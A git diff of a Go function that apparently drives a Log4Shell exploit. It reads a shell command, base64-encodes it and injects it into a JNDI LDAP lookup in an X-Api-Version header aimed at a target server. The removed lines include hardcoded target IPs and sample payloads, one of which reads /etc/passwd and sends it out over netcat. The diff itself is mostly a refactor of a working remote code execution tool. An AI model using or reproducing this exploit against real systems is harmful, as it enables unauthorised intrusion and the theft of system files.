@@ -13,9 +13,6 @@ import (
 
 func PayloadInput() {
 	var payloadcmd string
-	// targetip := "168.138.44.152" // Oracle 2
-	// targetip := "217.142.235.125" // Oracle 1
-	// targetport := "8080"
 	targetip, targetport := sysinfo.TargetInfo()
 	sourceip, err := sysinfo.GetIntIP()
 	if err != nil {
@@ -30,26 +27,31 @@ func PayloadInput() {
 	} else {
 		fmt.Println("Curl successful.")
 		for {
-			exitChan := make(chan struct{})
 			fmt.Println("Enter the payload command:")
 			scanner := bufio.NewScanner(os.Stdin)
 			if scanner.Scan() {
 				payloadcmd = scanner.Text()
 			}
-			// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
-			// payloadcmd = 'sh -c "cat /etc/passwd > /tmp/test"'
 			fmt.Println("Payload command:", payloadcmd)
 			encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
+			fmt.Println("Sending payload...")
 			targeturl := "http://" + targetip + ":" + targetport
-			req, err := http.NewRequest(("GET"), targeturl, nil)
+			// req, err := http.NewRequest("GET", targeturl, nil)
+			// req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
+			// if err != nil {
+			// 	fmt.Println("Error:", err)
+			// 	return
+			// }
+			req, err := http.NewRequest("GET", targeturl, nil)
+			req.Header = http.Header{
+				"X-Api-Version": []string{"${jndi:ldap://" + sourceip.String() + ":1389/Basic/Command/Base64/" + encodedpayloadcmd + "}"},
+			}
 			if err != nil {
 				fmt.Println("Error:", err)
 				return
 			}
-			req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
-			fmt.Println("Sending payload...")
 			client := &http.Client{
-				Timeout: 10 * time.Second,
+				Timeout: 5 * time.Second,
 			}
 			resp, err := client.Do(req)
 			if err != nil {
@@ -65,13 +67,11 @@ func PayloadInput() {
 				continue
 			}
 			if string(responseBody) == "Hello, world!" {
-				fmt.Println("Payload sent. Expoloit successful.")
+				fmt.Println("Payload sent. Exploit successful.")
 				fmt.Println("Do you want to send another payload? (yes/no)")
-				scanner := bufio.NewScanner(os.Stdin)
 				if scanner.Scan() {
 					response := scanner.Text()
 					if response != "yes" {
-						close(exitChan)
 						break
 					}
 				}
